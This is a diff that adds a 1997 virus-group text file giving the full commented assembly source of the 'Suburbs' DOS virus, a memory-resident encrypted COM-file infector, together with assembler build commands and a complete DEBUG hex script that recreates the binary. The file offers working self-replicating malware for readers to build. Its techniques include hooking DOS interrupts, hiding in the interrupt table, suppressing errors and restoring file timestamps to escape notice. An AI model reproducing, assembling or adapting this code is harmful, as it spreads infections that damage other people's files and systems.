@@ -1,0 +1,308 @@
+      ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
+      ³      Suburbs virus (c) 1997, by Virtual Daemon of SLAM      ³
+      ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
+
+   Here's the source for the Suburbs virus. I made him a couple of time ago,
+when I didn't know how to do a REAL virus... ;-)
+The source is commented enough to understand it (I think), so you shouldn't 
+have any difficulties...
+   The virus is kind of lame, but it use a good method for going resident, 
+so if you don't know it already, here's the chance for you to learn it!
+   Ok. Here's some info about it...
+
+ Virus Name: Suburbs (level 16 of DOOM ][)
+ Virus Author: Virtual Daemon
+ Virus Group: SLAM Virus Team
+ Virus Size: 400 bytes
+
+ Features: - resident encrypted COM infector with INT21h handler
+           - infect on 4bh (execute)
+           - use 80286 instructions (8086 are dead! :)
+           - use the free space at the end of the interrupt table at 0:0200h
+             => can't be seen with programs like MEM or TSRLIST and it
+                doesn't take 1K from 640! :)
+           - use INT24 handler (doesn't display errors)
+           - save/restore file time/date/attributes
+           - very simple encryption of the 3 bytes from JMP
+           - no payload... sorry! :-(
+
+---------------------------------- cut here -----------------------------------
+;
+; To build this shit use: tasm suburbs.asm
+;                         tlink /t suburbs.obj
+;
+.286    ;use 80286 instructions (can be modified easily to work with 8086)
+code segment byte
+   assume cs:code,ds:code
+   org 100h
+begin:
+   db 0e9h              ;jmp to virus_start
+len dw 8                ;offset begin+8 bytes - where to Jump
+
+   db '$'
+   db '$'
+   db 5 dup(90h)        ;5 NOP's+RET=a simple program so the virus can work
+   ret
+
+virus_start:
+   jmp install          ;install the virus in memory
+
+new24handler equ $-virus_start
+int24handler:
+   mov al,3             ;return to program indicating a failed DOS function
+   iret                 ;return from interrupt
+new21handler proc
+   cmp ah,4bh           ;4bh=execute a file
+   je infect_it         ;cool... a file was executed! let's infect it!
+   jmp restore_interrup
+infect_it: 
+   pusha                ;save registers: ax,bx,cx,dx,bp,si,di,ds,es
+   push ds
+   push es 
+
+   mov ax,4300h         ;DOS function = get file attributes
+   int 21h
+   push cx              ;save file attribute
+   push ds              ;save the ASCIIZ adress of file
+   push dx
+   
+   mov ax,4301h         ;DOS function = set new file attributes
+   xor cx,cx            ;cx=0 => file attribute=normal file
+   int 21h
+   
+   mov ax,3d02h         ;DOS function = open file for read-write
+   int 21h
+   xchg bx,ax           ;save handle in bx
+   
+   mov ax,0020h
+   mov ds,ax            ;set DS to new adress
+     
+   mov word ptr ds:[buffer],bx    ;save file handle
+   
+   mov ax,3524h         ;DOS function = get interrupt vector (INT 24h)
+   int 21h
+   push es              ;save INT 24h segment
+   push bx              ;save INT 24h offset
+
+   mov ax,2524h         ;DOS function = set interrupt vector (INT 24h)
+   mov dx,new24handler  ;make it point to our procedure
+   int 21h
+infectfile:
+   mov bx,word ptr ds:[buffer]    ;restore file handle
+   
+   mov ax,5700h         ;DOS function = get file time/date
+   int 21h
+   push dx              ;save date
+   push cx              ;save time
+   
+   mov ah,3fh           ;DOS function= read from file
+   mov dx,buffer        ;save into 'buffer'
+   mov cx,3             ;read 3 bytes
+   int 21h
+   jnc continue         ;if no error then continue
+   jmp close_file       ;else close the file and return to original program
+continue:
+   cmp word ptr ds:[buffer],'ZM'  ;check too see if file is EXE
+   je close_file                  ;is EXE? Then exit
+      
+   cmp word ptr ds:[buffer],'MZ'  ;check again for EXE (in ZM form)
+   je close_file                  ;is EXE? Then exit
+   
+   mov ax,4200h         ;DOS function = set file pointer
+   xor cx,cx
+   mov dx,word ptr ds:[buffer+1]  ;seek to beginning+0:[buffer+1]+3
+   add dx,3
+   int 21h
+     
+   mov ah,3fh           ;DOS function = read from file
+   mov dx,virus_end+2   ;from virus_end+2
+   mov cx,3             ;read 3 bytes
+   int 21h
+
+   cmp byte ptr ds:[virus_end+2],0e9h  ;check if already infected
+   je close_file 
+encrypt:
+   xor byte ptr ds:[buffer],33         ;encrypt the 3 bytes from JMP
+   xor byte ptr ds:[buffer+1],133
+   xor byte ptr ds:[buffer+2],45
+
+   mov ax,4202h         ;DOS function = set file pointer
+   xor cx,cx            ;seek to EOF
+   xor dx,dx
+   int 21h
+   mov bp,ax		;bp=ax=filesize
+     
+   mov ah,40h           ;DOS function = write to file
+   xor dx,dx            ;current buffer
+   mov cx,virus_end     ;number of bytes=virus_end
+   int 21h
+   jc close_file        ;if error then close the file
+
+   mov ax,4200h         ;DOS function = set file pointer
+   xor cx,cx            ;seek to beginning
+   xor dx,dx
+   int 21h
+
+   mov si,virus_end+1
+   mov byte ptr ds:[virus_end+1],0e9h   ;put the JMP code (0e9h)
+   mov ax,bp            ;bp=filesize
+   sub ax,3             ;ax=filesize-3 (size of JMP code)
+                                     
+   mov word ptr ds:[virus_end+2],ax ;save the 2nd & 3rd bytes in JMP
+
+   mov dx,virus_end+1   ;write new JMP (3 bytes)
+   mov ah,40h           ;DOS function = write to file
+   mov cx,3
+   int 21h
+close_file:
+   mov ax,5701h         ;DOS function = set file date/time
+   pop cx               ;restore time
+   pop dx               ;restore date
+   int 21h
+   
+   mov ah,3eh           ;DOS function = close file
+   int 21h                   
+
+   pop dx               ;restore INT 24h offset
+   pop ds               ;restore INT 24h segment
+   mov ax,2524h         ;DOS function = set interrupt vector (for INT 24h)
+   int 21h
+   
+   mov ax,4301h         ;DOS function = set file attributes
+   pop dx               ;restore the ASCIIZ adress of file
+   pop ds
+   pop cx               ;restore file attributes
+   int 21h
+   
+   pop es               ;restore saved registers
+   pop ds
+   popa
+restore_interrup:
+   db 0eah              ;jmp to old INT21h vector
+
+add21 equ $-virus_start
+int21offset    dw 0     ;old INT21h offset
+int21segment   dw 0     ;old INT21h segment
+new21handler endp
+
+install:
+   db 66h               ;for Sourcer :^)
+   pusha                ;save all registers
+   push ds
+   push es
+     
+   mov di,ds
+     
+   mov ax,20h
+   mov ds,ax
+   cmp word ptr ds:[0],0          ;check to see if already installed
+   jne quit
+     
+   mov ds,di
+     
+   xor ax,ax            ;save the old INT 21h interrupt vector using direct
+   mov es,ax            ;manipulation
+   mov di,21h*4
+   mov ax,es:[di]
+   mov bx,es:[di+2]
+     
+   mov si,[len]
+   add si,add21+103h
+   mov word ptr cs:[si],ax
+   mov word ptr cs:[si+2],bx 
+      
+   xor ax,ax
+   mov di,ax
+   mov si,[len]
+   add si,100h+3
+   push cs
+   pop ds
+   mov ax,0020h         ;copy virus to memory
+   mov es,ax
+   mov cx,virus_end
+   rep movsb
+     
+   xor ax,ax            ;set new INT 21h handler
+   mov es,ax
+   mov di,21h*4
+   mov word ptr es:[di],6 
+   mov ax,0020h
+   mov word ptr es:[di+2],ax
+quit:
+   mov ax,cs
+   mov ds,ax
+   mov es,ax
+     
+   mov si,[len]         ;get the 3 bytes from buffer in si register
+   add si,100h+buffer+3
+decrypt:
+   xor byte ptr ds:[si],33         ;decrypt the 3 bytes
+   xor byte ptr ds:[si+1],133
+   xor byte ptr ds:[si+2],45
+
+   mov di,100h          ;copy the 3 bytes from JMP
+   mov cx,3
+   rep movsb
+
+   pop es               ;restore saved registers
+   pop ds
+   popa
+
+   push 100h            ;return to host
+   ret
+
+buffer equ $-virus_start
+jmpbyte1 db 177         ;the JMP instruction encrypted with a simple XOR
+jmpbyte2 db 21
+jmpbyte3 db 189
+virus_author db '[VD/SLAM]',0
+virus_name   db 'Suburbs',0
+virus_end equ $-virus_start
+
+code ends
+end begin
+ --------------------------------- cut here ----------------------------------
+
+ Here's a copy of Suburbs in debug script format for those who don't have
+Turbo Assember/Linker. Just enter DEBUG < script_name.
+
+ --------------------------------- cut here ----------------------------------
+N SUBURBS.COM
+E 0100 E9 08 00 24 24 90 90 90 90 90 C3 E9 F3 00 B0 03
+E 0110 CF 80 FC 4B 74 03 E9 E3 00 60 1E 06 B8 00 43 CD
+E 0120 21 51 1E 52 B8 01 43 33 C9 CD 21 B8 02 3D CD 21
+E 0130 93 B8 20 00 8E D8 89 1E 7B 01 B8 24 35 CD 21 06
+E 0140 53 B8 24 25 BA 03 00 CD 21 8B 1E 7B 01 B8 00 57
+E 0150 CD 21 52 51 B4 3F BA 7B 01 90 B9 03 00 CD 21 73
+E 0160 03 EB 7C 90 81 3E 7B 01 4D 5A 74 73 81 3E 7B 01
+E 0170 5A 4D 74 6B B8 00 42 33 C9 8B 16 7C 01 83 C2 03
+E 0180 CD 21 B4 3F BA 92 01 90 B9 03 00 CD 21 80 3E 92
+E 0190 01 E9 74 4B 80 36 7B 01 21 80 36 7C 01 85 80 36
+E 01A0 7D 01 2D B8 02 42 33 C9 33 D2 CD 21 8B E8 B4 40
+E 01B0 33 D2 B9 90 01 90 CD 21 72 25 B8 00 42 33 C9 33 
+E 01C0 D2 CD 21 BE 91 01 90 C6 06 91 01 E9 8B C5 2D 03 
+E 01D0 00 A3 92 01 BA 91 01 90 B4 40 B9 03 00 CD 21 B8 
+E 01E0 01 57 59 5A CD 21 B4 3E CD 21 5A 1F B8 24 25 CD 
+E 01F0 21 B8 01 43 5A 1F 59 CD 21 07 1F 61 EA 00 00 00 
+E 0200 00 66 60 1E 06 8C DF B8 20 00 8E D8 83 3E 00 00 
+E 0210 00 75 4B 8E DF 33 C0 8E C0 BF 84 00 26 8B 05 26 
+E 0220 8B 5D 02 8B 36 01 01 81 C6 F5 01 2E 89 04 2E 89 
+E 0230 5C 02 33 C0 8B F8 8B 36 01 01 81 C6 03 01 0E 1F 
+E 0240 B8 20 00 8E C0 B9 90 01 90 F3 A4 33 C0 8E C0 BF 
+E 0250 84 00 26 C7 05 06 00 B8 20 00 26 89 45 02 8C C8 
+E 0260 8E D8 8E C0 8B 36 01 01 81 C6 7E 02 80 34 21 80 
+E 0270 74 01 85 80 74 02 2D BF 00 01 B9 03 00 F3 A4 07 
+E 0280 1F 61 68 00 01 C3 B1 15 BD 5B 56 44 2F 53 4C 41 
+E 0290 4D 5D 00 53 75 62 75 72 62 73 00 
+RCX
+019B
+W
+Q
+ --------------------------------- cut here ----------------------------------
+
+                                Virtual Daemon
+                Viral Development Researcher & Virii Colector
+                          Member of SLAM Virus Team
+                            Network Administrator
+                      E-mail: virtual_daemon@hotmail.com
+           Web: http://www.geocities.com/SiliconValley/Heights/3334
